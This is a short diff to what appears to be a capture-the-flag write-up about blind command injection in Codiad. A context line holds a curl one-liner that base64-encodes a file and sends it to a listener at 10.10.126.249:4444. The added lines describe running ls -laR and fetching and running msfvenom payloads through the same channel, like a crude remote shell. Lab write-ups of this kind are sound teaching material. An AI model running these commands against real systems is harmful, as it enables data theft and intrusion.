@@ -63,6 +63,8 @@ To exploit this is a bit tricky, since its blind: you can't get the response bac
 
 Then, you can exfiltrate data, by passing a command like `cat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T`, which will read that download.dat file, base 64 encode it, then pass it to a curl request to your webserver (where you will see the request arrive with a big payload in the querystring).
 
+I've used this technique before to enumerate a machine, as a wonky remote shell. Via this you could run `ls -laR` to find download.dat, download and run msfvenom packages, examine running processes etc - anything you can encode and xarg into curl and pass into that http body without breaking the request format.
+
 So, back to the vulnerable component: to call this, and do the above, here is the raw http request. Its basically a post to that controller endpoint, with the basic auth header, the codiad cookie (so you will need to log in at least once), and the (unencoded!) body:
 
 ```http
